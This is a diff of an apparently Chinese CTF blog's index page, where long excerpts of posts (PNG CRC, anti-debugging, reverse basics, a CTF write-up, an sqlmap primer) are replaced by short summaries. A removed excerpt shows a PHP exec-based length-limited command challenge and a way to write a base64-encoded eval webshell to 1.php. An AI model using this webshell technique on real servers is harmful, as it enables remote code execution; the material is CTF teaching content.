@@ -125,37 +125,12 @@
         alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/icon.jpg"
         title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/icon.jpg" height="100"   width="100" ></a></div><h2 class="home-subtitle"><div id="id-1" class="typeit"></div></h2><div class="links"><a href="https://github.com/https://github.com/scofield1920" title="GitHub" target="_blank" rel="noopener noreferrer me"><span class="fab fa-github-alt fa-fw"></span></a><a href="mailto:scofield_1920@outlook.com" title="Email" rel=" me"><span class="far fa-envelope fa-fw"></span></a></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/pngcrc/">pngCRC</a>
-    </h1><div class="post-meta">
-        <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>misc</a></span></div><div class="content">基础：用010editor打开该png分析其字节信息
-前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的
-chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的
-◎之后的四个字节****49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的
-◎之后进入13位数据块，前8个字节00 00 05 A0 00 00 03 84中：
-前四个字节00 00 05 A0（即为十进制的1366），代表该图片的宽，该段数据是由图片的实际宽决定的 后四个字节00 00 03 84（即为十进制的900），代表该图片的高，该段数据是由图片的实际高度决定的 这8个字节都属于13位数据块的内容，因此数据块应再向后数5个字节，即为00 00 05 A0 00 00 03 84 08 02 00 00 00
-剩余的4位D8 2F 01 85为该png的CRC检验码，该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 A0 00 00 03 84 08 02 00 00 00）计算得到的
-绿色部分是IHDR数据, 里面的00 00 01 f4是宽, 00 00 01 af是高，红色部分是CRC32, 是根据绿色部分算出来的</div><div class="post-footer">
-        <a href="/pngcrc/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/misc/">misc</a>,&nbsp;<a href="/tags/ctf/">CTF</a></div></div>
-</article>
-
-
-
-<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/rce_advanced/">rce_进阶</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div><div class="content">字符数量限制bypass题目限制了命令的长度，只能7个字符。
-1 2 3 4 5 6 7 8 9 10 11 &lt;?php $sandbox = dirname(__FILE__).&#39;/sandbox_&#39; . md5(&#34;orange&#34; . $_SERVER[&#39;REMOTE_ADDR&#39;]); mkdir($sandbox,0755,true); chdir($sandbox); if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 7) { @exec($_GET[&#39;cmd&#39;]); } else if (isset($_GET[&#39;reset&#39;])) { @exec(&#39;/bin/rm -rf &#39; . $sandbox); } highlight_file(__FILE__); ?&gt; 我们可以利用Linux命令特性，来写入一句话木马
-每次提交不超过7个字符的命令，写入一句话木马的执行语句到文件名，然后通过sh a ls -t，利用文件名组成写入一句话木马的命令
-要写入的一句话木马：
-1 &lt;?php eval($_GET[1]); base64编码后:
-1 PD9waHAgZXZhbCgkX0dFVFsxXSk7 最终需要被执行的语句：
-1 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 然后将语句分拆，输出为文件名：
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 &gt;hp &gt;1.</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/manual/"><i class="far fa-folder fa-fw"></i>manual</a></span></div><div class="content"><p>进阶版rce_payload</p></div><div class="post-footer">
         <a href="/rce_advanced/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></div></div>
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/manual/">manual</a></div></div>
 </article>
 
 
@@ -164,41 +139,9 @@ chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制�
         <a href="/reverse-antidbg/">Reverse-AntiDBG</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>Reverse</a></span></div><div class="content">关于反调试分为静态反调试和动态反调试
-调试常用的工具IDA Pro	Ollydbg peid(查壳工具)
-一.栈指针平衡ESP寄存器指向当前栈顶元素的地址，是栈操作的重要寄存器。
-EBP寄存器通常用于指向当前函数的基址（起始地址）或堆栈帧的基址。
-当我们用IDA进行静态分析，用F5进行反编译的时候，会出现如下这种报错：
-sp：stack pointer 栈指针
-为解决这个问题，我们首先要清除是什么地方导致栈指针不平衡，根据报错：
-找到这个地方之后，要进行栈指针分析，此时要设置一下IDA，让其显示栈指针Options-General-Disassembly-&quot;Stack pointer&quot;
-栈的生命周期结束后，ESP和EBP寄存器的值会恢复到它们在函数调用前的值
-然而，我们看到的这个pop指令后的栈指针与入栈的栈指针不一致
-这就引起了栈指针不平衡，因此我们需要手动调节栈指针，让其恢复平衡 Attention：每条语句前的栈指针是这条语句未执行的栈指针 我们在IDA中使用Alt+k可以修改栈指针
-修改后的值为：0X21E-0X4 = 0X21A
-(然而，根据大佬在博客中的解释，栈指针不平衡可能是IDA的一个漏洞)
-IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注&quot;sp-analysis failed&quot;。一般编程中，不同的函数调用约定(如stdcall&amp;_cdcel call)可能会出现这种情况；另外，为了实现代码保护而加入代码混淆(特指用push/push+ret实现函数调用)技术也会出现这种情况。
-我看的这篇文章是2019年发布的，或许当年的IDA还有这方面缺陷，然而我下载了其博客中的附件进行复现的时候，发现并没有其博客中出现的问题，可以直接进行反编译，或许是新版本的IDA进行了自动修复
-二.花指令0x1 花指令概述​	在正常的代码流程中通过内联汇编或者插入机器码的方式来干扰指令执行的顺序，从而影响反汇编引擎的工作，导致反汇编工具难以正确地识别代码
-​	是反静态调试的一种手段，从而加大逆向分析难度
-0x2 花指令又是怎样影响栈指针的我们可以写一个简单的花指令，来分析其如何影响栈指针的
-asm指令的作用：用于调用内联汇编程序，并且可在C或C++语句合法时出现，asm后跟一个程序指令集、一组括在大括号中的指令集或者至少一堆空大括号
-emit指令的作用：
-编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 用emit就是在当前位置直接插入数据（实际上是指令），一般是用来直接插入汇编里面没有的特殊指令，多数指令可以用asm内嵌汇编来做，没有必要用emit来做，除非你不想让其它人看懂你的代码。
-将改程序编译成exe，然后用IDA进行反编译，之后双击访问func2();,产生栈指针不平衡报错，以此可以达到反跟踪的目的
-在编程语言中，通常以一个下划线开头的函数或变量名表示该函数或变量是库或系统的内部实现，不应该在用户代码中直接使用。这种命名约定通常被称为“前缀保留”。
-有些编程语言还使用了双下划线前缀来表示特殊含义，例如：
-attribute：在C和C++中，__attribute__关键字用于指定变量或函数的属性，例如对齐方式、强制inline等。 __init和__exit：在Linux内核中，这些函数是内核模块初始化和清理函数的标准名称。 需要注意的是，使用双下划线前缀是非标准的命名约定，因此在编写代码时应该尽可能避免使用这种方式，以免与标准库或系统库的命名冲突。
-0x3 花指令分类可执行花指令​	1.可执行花指令指的是这部分花指令代码在程序的正常执行过程中会被执行，但执行这些代码没有任何意义，执行前后不会改变寄存器的值(eip这种除外)，同时这部分代码也会被反汇编器正常识别。
-​	2.花指令的首要目的是加大静态分析的难度，让你难以识别代码的真正意图，同时可以破坏范斌已的分析，使得栈指针在反编译引擎中出现异常。
-不可执行花指令​	1.花指令虽然被插入到了正常的代码中间，但是并不意味着一定会得到执行，这类花指令通常形式为在代码中出现了类似数据的代码，或者IDA反汇编后为jmupout(xxxxx).
-​	2.这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序正常运行。
-0x3 一点点收集1.简单的花指令0xe8是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析。
-jz，jnz意味着无论如何都将跳转到labell这个无效数据
-2.简单的jmpPD能被骗过去，但是因为IDA采用的是递归扫描算法所以能够正常识别
-1 2 3 4 5 6 7 8 9 10 #include&lt;stdio.</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>reverse</a>&nbsp;<a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>notes</a></span></div><div class="content"><p>reverse反调试基础</p></div><div class="post-footer">
         <a href="/reverse-antidbg/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/ctf/">CTF</a></div></div>
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/notes/">notes</a></div></div>
 </article>
 
 
@@ -207,22 +150,9 @@ jz，jnz意味着无论如何都将跳转到labell这个无效数据
         <a href="/reverse-basis1/">Reverse-Basis1</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>Reverse</a></span></div><div class="content">操作码（opcode）也就是机器指令
-C语言编译流程：
-1 C语言代码--&gt;汇编语言--&gt;机器代码 0x01IDA定位main函数打开字符串表，进行字符串搜索来定位，随后通过交叉引用列表定位到引用了该字符串的代码
-定位之后对符号重新命名
-strcmp用来进行字符串比较，若相同的话，返回0，若进行取反，即!strcmp则字符串相同返回1
-0x02简单的加密算法举一个简单的小栗子 根据加密逻辑进行一个逆运算
-再来看一个简单的小栗子
-异或异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。
-异或也叫半加运算，其运算法则相当于不带进位的二进制加法：
-二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1），
-关键理解：不进位的二进制算法
-明文^密钥=密文 密文^密钥=明文
-拿到T3拉进IDA，按照之前所学，定位main函数，反编译之后修改函数名
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __cdecl main_0(int argc, const char **argv, const char **envp) { size_t i; // [esp+D0h] [ebp-114h] char Str1[260]; // [esp+DCh] [ebp-108h] BYREF printf(&#34;[5] Hi CTFer,Input your flag:&#34;); scanf(&#34;%s&#34;, Str1); for ( i = 0; i &lt; j__strlen(Str1); ++i ) Str1[i] ^= i; if ( !</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>reverse</a>&nbsp;<a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>notes</a></span></div><div class="content"><p>reverse基础1</p></div><div class="post-footer">
         <a href="/reverse-basis1/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/ctf/">CTF</a></div></div>
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/notes/">notes</a></div></div>
 </article>
 
 
@@ -231,29 +161,9 @@ strcmp用来进行字符串比较，若相同的话，返回0，若进行取反�
         <a href="/reverse-basis2/">Reverse-Basis2</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>Reverse</a></span></div><div class="content">0x1 基本汇编指令 mov A B 将B的值复制到A里面去
-push A 将A压栈
-pop A 将A从栈中弹出来
-call Funtion 跳转到某函数
-ret &ndash;&gt; 相当于 pop ip 从栈中pop出一个值放到EIP里面
-je jz **如果ZF（0标志位）=1，就跳转，否则跳过这条语句，执行下面的语句。
-0x2 栈&amp;栈帧​	堆栈，就是计算机暂时储存的地方，固定的一端称之为栈底，变化的一端称之为栈顶
-​	栈的原则：先进后出，后进先出
-​	栈帧也叫过程活动记录，是编译器用来实现过程/函数调用的一种数据结构。
-​	C语言中，每个栈帧对应着一个未运行完的函数。栈帧中保存了该函数的返回地址和局部变量。
-​	函数每次调用，都有它自己独立的栈帧。栈帧中维持着函数调用所需要的各种信息，包括函数的传入，函数的局部变量、函数执行完成后下一步要执行的指令地址、寄存器信息等。
-0x3 运行时栈​	栈帧使用了栈这一数据结构，达到了后进先出(First In Last Out)的内存管理原则。不管是插入数据还是删除数据，都是在栈顶进行的。
-​	x86-64的栈由高地址向低地址增长，寄存器rbp指向当前栈帧的底部(高地址)，寄存器rsp指向当前栈帧的顶部(低地址)。数据压栈和出栈会修改rsp的值。通过push指令将数据存入栈中，同时64位系统中会对栈顶指针做减法操作rsp=rsp-8。pop指令是push的逆操作，它将数据从栈中读取出来，同时64位系统中会对栈顶指针做加法操作rsp=rsp+8
-​	当过程P调用过程Q时，
-​	1.把实参压栈，cdecl是gcc的默认调用约定，实参压栈顺序为从右至左
-​	2.把返回地址(即P调用Q后的下一条指令地址)压入栈中，表示当Q返回后，P程序下一步要从那条指令开始运行
-​	3.开始调用Q，首先将P的栈底rbp压栈，然后栈顶rsp赋值给rbp，从而形成新的栈底地址。我们再看函数调用的汇编代码时，经常看到的一段正是在做这个操作
-1 2 push	rbp mov	rbp,rsp ​	4.分配局部变量空间，开始具体执行Q函数的指令代码
-0x3 转移控制​	将控制从函数P转移到函数Q只需要将程序计数器(PC)设置为Q函数代码的起始位置。另外，稍后从Q返回时处理器还需要继续执行P的下一条指令A。在x86-64中，这个过程是用执行call Q指令来完成的。该指令将A的地址压栈，并将PC设置为Q的起始地址。
-​	Q执行完成后弹出A地址这个过程是通过ret指令完成的，它会弹出地址A，并把PC设置为A
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include&lt;iostream&gt; #include&lt;stdint.</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/reverse/"><i class="far fa-folder fa-fw"></i>reverse</a>&nbsp;<a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>notes</a></span></div><div class="content"><p>reverse基础2</p></div><div class="post-footer">
         <a href="/reverse-basis2/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/ctf/">CTF</a></div></div>
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/reverse/">reverse</a>,&nbsp;<a href="/tags/notes/">notes</a></div></div>
 </article>
 
 
@@ -262,59 +172,7 @@ je jz **如果ZF（0标志位）=1，就跳转，否则跳过这条语句，执�
         <a href="/skynico2022.11/">SkyNICO2022.11三校联赛</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div><div class="content">【Misc福利题】sign sign sign签到题不必多说了，扫描二维码复制字符串，放进[随波逐流]一键base 但一定要注意，要把字符串复制全，别漏了末尾的等号(可能三个)
-[Misc]幸亏开着wiresharktips:Wanna有个HID键盘和Cisco交换机 下载附件之后，解压发现有个txt后缀的文件和png文件，都显然不是既定后缀文件，放进010edits，查看文件头和ASCII转码显示的字符，发现那个那个所谓的txt文件是一个7z压缩包，而那个png文件
-其实题目名称已经有暗示了，直接拖进wireshark
-同时我也对该题进行了百度，数据协议:USB，是抓取的键盘流量，下载相关脚本，但怎么也跑不出来，经过了许久地反复横跳，我发现了问题所在，本次题目文件中有些许冗杂的数据，阻碍了脚本的运行
-删掉他们重新导出pcapng数据，只保留一下信息
-重新跑脚本，得到了压缩包密码：where is you 解压后得到了一个文本文件，系Cisco交换机配置文件
-好骚的题，复制那堆emoji表情进行解码，得到hint，解码password7可得flag 随后去搜索，Cisco交换机加密方式，
-看到了7！一眼丁真，在线网站直接解密
-【Misc福利题】啊吧啊吧也算是签到题吧，发送到foremost进行分解，然后OCR提取flag，同时遇到了一个问题，flag死活不对，原因系相似字符混淆注意。一定要注意形似字符区分(好丢nian)
-lI| lI|
-不同字体会有不一样的显示
-[Misc]Pixels In Picture放大仔细看，有隐写的像素点，就叫他像素点隐写吧，也没啥太好的办法，拉进ps或者lr，
-我的办法是，能直接读的就读，看不清就拉参数，结合lr和Stegsolve多生成几张对比着看
-愣看，不知道师傅们有什么更好的方法。
-[Misc]希尔伯特的微笑当你跳跃维度，希尔伯特在向你微笑，从alpha的角度看去，在希尔伯特曲线中领悟真谛，上下颠倒，在Quine中，发现隐藏在空白之下的秘密
-真不好意思，这个题被我做成社工题了，
-摘自：https://www.anquanke.com/post/id/244533
-题目描述：“三体人要入侵地球了，听说他们要使出最厉害的武器”
-打开图片，发现有三个重复的图形，下面有”DIFOIL”字样，再下面好像还有一串字，但看不清楚。
-图片看起来很奇怪，三个图形也呼应了“ThreeBody”的题目名称。
-对于图片题目常规操作，使用StegSolve查看各图层，能发现两张隐藏的图片，其他图层再没有什么可疑的东西了：
-图片上能认出半个星球、一个宇航员、一只手，以及《三体》中经典的一句话“你们都是虫子”。
-对三体比较熟悉的同学可能可以猜出这张图以及原始图片是三体人使用二向箔对地球进行降维打击的场景。
-这里也是小小地调侃了一下选手。如果不能找到通往下一步的方法，便只能停留在这里，被三体人嘲讽为“虫子”。
-让我们再回到原始图片，放大看其中的细节：
-可见图片中红黄蓝绿交错，有老式电视像素点的感觉。
-通过010Editor查看像素点数值：
-可见相邻像素点的RGB值都差异巨大，正常情况下相邻像素点的RGB值应该差不多才对。
-再仔细观察可以发现，如果以4为周期的话相邻像素的数值就差不多了，考虑正常情况下该图片的像素点应该是每4个一组。相当于原始图片是四维的，这里被“降维打击”成了三维。我们这里需要做的，便是对图片进行升维处理。
-BMP格式的头部有个字节是控制每个像素点所占的比特数，现在为24，也就是3个字节，我们将这个字段改为4个字节对应的32：
-biBitCount
-保存后重新打开图片，便可以看到正常的图形了：
-再次通过StegSolve进行查看，可以发现隐藏图片：
-很多人看到“Welcome to QWB”可能就放松了警惕，以为这是一张随便放的没啥用的图片，便去找其他线索了。在CTF题目中忽视作者所给的线索是大忌，其实这里是非常关键的，所以在比赛过程中我有提示“所有图片的内容都是有意义的”。
-其实细心的话可以看到左上角有一些小白点，代表着那里隐藏着一些信息。使用StegSolve的Data Extract功能查看该空间：
-可以看到有“Who am I?”的字样。
-再以列为方式查看：
-可以看到有“David”字样。
-根据这张照片和“David”的提示，通过一番搜索可得知这一位是知名的数学家大卫·希尔伯特：
-不过除此之外我们得不到更多的信息了。Flag在哪呢？
-让我们再用010Editor查看修改后的图片：
-可以看到每个像素除了有RGB三个字段外还有一个字段，代表图片还有另一个通道。
-rgbReserved
-这个字段有些跟是一样的，但也有一些有细微差异。
-rgbBlue
-信息会不会就隐藏在字段呢？
-rgbReserved
-字段是有数值的，所以该通道肯定有对应的图形，不过刚才通过StegSolve并没有看到该通道。
-rgbReserved
-这里一个方法是修改BMP的文件头，使得StegSolve把该通道识别为Alpha通道。
-不过这个可能需要了解一些BMP头相关的知识。这里采用一个更为暴力的方法，通过一个Python脚本解析BMP文件结构，把的数值复制给：
-rgbReserved
-rgbBlue</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div><div class="content"><p>2022SkyNICO CTF三校联赛wp</p></div><div class="post-footer">
         <a href="/skynico2022.11/">Read more...</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wp/">wp</a></div></div>
 </article>
@@ -325,22 +183,20 @@ rgbBlue</div><div class="post-footer">
         <a href="/sqlmap_common_commands/">sqlmap常用命令</a>
     </h1><div class="post-meta">
         <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
-        </span>&nbsp;<span class="post-publish">published on <time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/tools/"><i class="far fa-folder fa-fw"></i>tools</a></span></div><div class="content">sqlmap简介： sqlmap是一款开源免费的漏洞检查、利用工具. 可以检测页面中get,post参数,cookie,http头等. 可以实现数据榨取 可以实现文件系统的访问 可以实现操作命令的执行 还可以对xss漏洞进行检测 sqlmap 支持5种漏洞检测类型: 基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and 1=1(和没加and1=1结果保持一致) 和 and 1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. ) 基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的 基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错 则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.)) 基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息) 基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作) option类：　sqlmap &ndash;version 查看sqlmap版本信息.
--h　查看功能参数(常用的)
--hh　查看所有的参数 (如果有中文包 就最好了)
--v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.
-​ Target(指定目标):
--d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.
--u　指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1
--l　指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描
--x　以xml的形式提交一个站点地图给sqlmap(表示不理解..)
--m　如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描
--r　把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体
--g　利用谷歌搜索引擎搭配正则来过滤你想要的
--c　加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描
-扫描类型：get扫描：　-u 指定一个带参数的url地址进行扫描.</div><div class="post-footer">
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/manual/"><i class="far fa-folder fa-fw"></i>manual</a></span></div><div class="content"><p>sqlmap常用命令手册</p></div><div class="post-footer">
         <a href="/sqlmap_common_commands/">Read more...</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/tools/">tools</a></div></div>
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/manual/">manual</a></div></div>
+</article>
+
+
+
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/ssrf/">SSRF</a>
+    </h1><div class="post-meta">
+        <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+        </span>&nbsp;<span class="post-publish">published on <time datetime="2023-11-17">2023-11-17</time></span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>notes</a></span></div><div class="content"><p>一点SSRF初学笔记</p></div><div class="post-footer">
+        <a href="/ssrf/">Read more...</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/notes/">notes</a></div></div>
 </article>
 
 
